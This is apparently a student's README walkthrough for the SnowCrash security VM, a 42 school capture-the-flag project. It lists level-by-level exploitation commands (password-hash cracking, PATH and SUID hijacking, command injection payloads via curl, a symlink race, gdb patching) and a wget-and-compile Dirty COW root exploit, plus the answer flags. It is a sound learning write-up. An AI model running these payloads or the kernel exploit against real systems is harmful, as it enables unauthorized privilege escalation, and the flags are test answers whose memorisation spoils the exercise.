# snow_crash
Security project of 42school


Link to the VM: https://projects.intra.42.fr/uploads/document/document/5137/SnowCrash.iso.


## Level00

Find interesting files: `find / -user flag00`.
File conraining `cdiiddwpgswtgt` founded.
Supposed to be a `Caesar Cipher`. Use [Dcode](https://www.dcode.fr/caesar-cipher).
Password is: `nottoohardhere`.
Flag is: `x24ti5gi3x0ol2eh4esiuxias`

## level01
Find interesting files: `find / -user flag01`.
Nothing founded, let's check in `/etc/passwd`.
Found:
`flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash`.
Put this onto a user.txt file and give it to `John`.

Command: `John Ressources/user.txt && John --show Ressources/user/txt`    

John output:
`flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash`.    

Password is: `abcdefg`.
Flag is: `f2av5il02puano7naaf6adaaf`.

## level02

There is a `level02.pcap` file. a `.pcap` file can be opened with `wireshark` and represent a capture of some network transmissions.     
First we need to extract this file using `scp`.
`scp -q -P 2222 level02@10.64.1.226:./level02.pcap ./level02/`

Then I open the file with Wireshark, select the first packet and `Follow the TCP stream`.
Now I can see the password in plain text: `Password: ft_wandr...NDRel.L0L`.
Then I need to interpret the DEL characters and get the remaining password.

Password is: `ft_waNDReL0L`.
Flag is: `kooda2puivaav1idi4f57q8iq`.

## level03

Their is only 1 SUID file that display: `Exploit me`.    

First I download the file to inspect it localy with:
`scp -q -P 4242 level03@10.1.6.4:./level03 ./level03/`

With the `strings` command we can find this line:
`/usr/bin/env echo Exploit me`

Here we can overide the echo program.    

Create a destination directory:    
`mkdir /tmp/O && chmod a+x /tmp/O`

Upload the exploit:
`scp -P 4242 echo.c level03@10.64.1.240:/tmp/O/`

Compile it:    
`gcc echo.c -o echo`

Add the new `echo` before the older in th PATH:    
`export PATH=/tmp/O:$PATH`
It result into something like this:    
`/tmp/O:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games`

Run again `./level03` and pouf! You are `flag03`and just have to run `getflag`.    

Flag is: `qi0maab88jeaj46qoumi7maus`.

## level04

There is a single SUID Perl file named: `level04.pl`.
It is a Perl script for a web server listening on port `4747`.    

We can inject a command by running:    
	curl -v http://localhost:4747/?x=\`getflag\`

Flag is: `ne2searoevaevoem4ov4ar8ap`.

## level05

A login message inform you that you have a new mail.
Display it with:    
`cat /var/mail/level05`
It informs you about a current cronjob:    
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`.

Find other interesting files: `find / -user flag05`.    
Bash script founded: `/usr/sbin/openarenaserver`.    

Exploit it with:
```
	mkdir /tmp/file
	touch /tmp/file/flag
	chmod 777 /tmp/file/flag
	echo "getflag > /tmp/file/flag" > /opt/openarenaserver/file
```
Then wait for the cron to run.
You can now display the flag with `cat /tmp/file/flag`.

Flag is: `viuaaale9huek52boumoomioc`.

## level06

There is two files:
- level06.php (a php code)
- level06 (the SUID compiled version of the above)

1 - open a file and read its content.
2 - Decode the regex and execute command.

Payload: "[x ${`getflag`}]"

Put it into a file with:
	chmod +w .
	mkdir payload
	chmod +w .
	echo "\"[x \${\`getflag\`}]\"" > payload
	./level06 payload

Flag is: `wiok45aaoguiboiki2tuin6ub`.

## level07

There is a file called `level07`.    

syscall founded:
- system
- asprintf
- getenv

strings founded:
- `/bin/echo %s`
- `LOGNAME`

1- the program use `system`.
2- the programme give it the command string: `/bin/echo %s`.
3- the program get the env variable `LOGNAME` and give it to asprintf.

Command: `export LOGNAME="level07 && getflag" && ./level07`
Flag is: `fiumuikeil55xe9cu4dood66h`.

## level08

There is 2 files:
- `level08` a SUID to exploit
- `token` an unreadable little file

`level08` dump the content of a file passed in parameter except if it's called `token`.    
First I gived myself the write permissions on the local directory with: `chmod +w .`.   

Then I create a symbolic link on token with: `ln -s token ./dodo` and run `./level08 dodo`.    

Token: `quif5eloekouj29ke0vouxean`.    

Then `su flag08` and `getflag`:    
Flag is: `25749xKZ8L7DkSCwJkT9dyv6f`

## level09

There is 2 files (again):
- `level09` a SUID to exploit
- `token` an little readable file

`token` content:
	0000000: 6634 6b6d 6d36 707c 3d82 7f70 826e 8382  f4kmm6p|=..p.n..
	0000010: 4442 8344 757b 7f8c 890a                 DB.Du{....

Gived to `./level09`:
	0000000: 6635 6d70 713b 7683 458b 897b 8e7b 9191  f5mpq;v.E..{.{..
	0000010: 5453 9557 8990 95a3 a10a                 TS.W......

Gived to `./level09` a second time:
	0000000: 6636 6f73 7540 7c8a 4d94 9386 9a88 9fa0  f6osu@|.M.......
	0000010: 6464 a76a 9da5 abba b90a                 dd.j......

Every time it increased the value of each bytes by their index.

So we can do a little C script to reverse it.

First I gived myself the write permissions on the local directory with: `chmod +w .`.   

Then upload the script:
`scp -P 4242 decode.c level09@127.0.0.1:decode.c`    
Compile it: 
`gcc -Wall -Wextra -Werror decode.c`    
And execute it like this: 
`cat token | ./a.out`.    
(Remove the '\n' with:)
`cat token | tr -d '\n' | ./a.out`.    


The original token was equal to: `f3iji1ju5yuevaus41q1afiuq`.    
Flag is: `s5cAJpM8ev6XHw998pRWG728z`.    

## Level10

The 2 same files are here again:
- `level10` a SUID to exploit
- `token` an little unreadable file

`level10` usage:
```
	./level10 file host
		sends file to host if you have access to it
```

First we need to create a server to catch the file with: `netcat -lvk 127.0.0.1 6969`    

Then we can easily transfer a file owned by us.    

But creating a symlink isn't enought to give us the reading permission on `token`.    

Is it a TOCTOU race condition? 

To test that I've wrote a bash script that do two things:
- loop over changing a symlink between a regular file and `token`
- looping on access to this symlink

First let's transfert the script on the VM: `scp -P 4242 race.sh level10@127.0.0.1:race.sh`.    
All we have to do then is to read data on our server and wait an incoming data that wasn't in the regular file: it's our `token`.    

TO IMPROVE: There is no clean way to stop this script from the current terminal.    

Token is: `woupa2yuojeeaaed06riuj63c`
Flag is: `feulo4b72j7edeahuete3no7c`

## Level11

This time we have a `.lua` SUID file:    
`-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua`    

This script start a local server on port 5151.    

It ask for a password wich look likes:
`f05d1d066fb246efe0c6f7d095f909a7a0cf34a0` after a sha1sum transformation.
it's reverse is: `NotSoEasy`.   
Let's try it and it returns to us: `Erf nope..`.     

Wrong way, restart from the begining:

In this line in the code:  `prog = io.popen("echo "..pass.." | sha1sum", "r")`
we can try to execute a custom command with the SUID permissions:

try: `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 #` and it return something new: `Gz you dumb*`.    

Make sure that you can write data into a specific file with:          
`-n '' && echo f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 && touch level11.lua #`     

Print the flag inside `level11.lua` with:    
`-n '' && getflag >> /home/user/level11/level11.lua touch /home/user/level11/level11.lua && echo f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 #`

Flag is: `fa6v5ateaw21peobuub8ipe6s`.   


# Level12

Ressource: https://perldoc.perl.org/perlrequick

There is only 1 Perl SUID file: `level12.pl`.    

It's another server script. listening on port 4646

The server support requests like this: `curl -X GET "http://localhost:4646/?x=xarg&y=yarg"` and the `x` parameter is exploitable.     

On this argument:
- Everything id uppercased
- And Everything after a whitespace is erased

How to avoid the upercasing? Use a script or a command with a naturaly uppercased name.

But to use a custom file or for every other trick, we need to specify a valid absolute uppercase path but we can't create it because of our permissions.   

	[...]

And after a long research, I've finaly reach THE tips:    
The savior was the `/*/*/script` tricks that allow me to avoid the utilisation alpha-numeric caracters.    

Then we create the exploit file with: `touch /dev/shm/EXPLOIT && chmod a+x /dev/shm/EXPLOIT && echo '#! /bin/bash' > /dev/shm/EXPLOIT && echo 'getflag >> /tmp/xd' >> /dev/shm/EXPLOIT`

Run the exploit with:
	curl -X GET "http://localhost:4646/?x=\`/*/*/EXPLOIT\`"

And read the flag with: `cat /tmp/xd`.    

Flag is: `g1qKMiRpXf53AWhDaU7FEkczr`.    

# Level13

Here is one SUID file named `level13`.    

It tells us: `UID 2013 started us but we we expect 4242`.    

A little look to `/etc/passwd` ensure us that we well have the UID `2013` and nobody have the UID `4242`.    

So let's create it!!

We can create a user with: `useradd [OPTIONS] USERNAME` and add the option `-u UID` to attribute it a specific UID.

Let's try: `useradd -u 4242 superman` and look the result:

	useradd: cannot lock /etc/passwd; try again later.

Too low permissions :/

Try another way with: `usermod -u 4242 level13`    
	usermod: user level13 is currently logged in

Switch to `level12`:
	usermod: cannot lock /etc/passwd; try again later.

Again :(


I think its a LD_PRELOAD hack.

What if we overide the return of getuid? 

	   uid_t getuid(void);

Upload the script:
`scp -P 4242 ./lib.c level13@127.0.0.1:lib.c`
Compile it:
`gcc -Wall -Wextra -Werror -o lib.so -c lib.c -fPIC -shared -ldl`
And add it to the preload:
`export LD_PRELOAD=/home/user/level13/lib.so`
Then run `./level13` aannd....
I get an error:
	ERROR: ld.so: object '/home/user/level13/lib.so' from LD_PRELOAD cannot be preloaded: ignored.
Maybe it is because it is part of the same family of `setuid/setgid` which is ignored?
Let's try with overiding `strdup` this time. 
	ERROR: ld.so: object '/home/user/level13/lib.so' from LD_PRELOAD cannot be preloaded: ignored.
Same error again, so maybe it is caused by a trusted directory sanitization and I've already checked that I've no write permissions on thoose files :/

...

Et si... Non quand même pas, ca ne serait pas aussi simple... testons au cas où...
...Okay je me suis fait chier pour rien :/

Simplement le lancer avec gdb et modifier la valeur du registre à suffit fait l'affaire:
- `gdb ./level13`
- `break getuid`
- `next`
- `set $eax=4242`
- `continue`

Flag is: `2A31L79asukciNyi8uppkEuSx`

# Level14

For the first time, their is not file to exploit.
I've already spend enough time on this machine to say that there is no file belonging to `level14` of `flag14`.

So maybe it's a kernel exploit?

Look at the version with `uname -a`:
	Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP Tue Jul 28 09:52:21 UTC 2015 i686 i686 i386 GNU/Linux

Linux kernel before 4.8.3 are vulnerable to: Dirty COW (CVE-2016-5195).    

I've tried some exploits without succes before reaching to: `https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c`.    
Download it:    
	`wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c`
Compile it:
	`gcc dirty.c -pthread -lcrypt -O2 && ./a.out root`
Then connect with `su root` and use `root` as password.

And here we are root !!!    

We can also customize the script to get the flag by connecting as `flag14` (UID = 3014).    

Flag is: `7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ`

Mention:     
This script `https://raw.githubusercontent.com/WazeHell/PE-Linux/master/PE.sh` is a useful enumeration script that also check if the OS is Dirty Cow vulnerable.     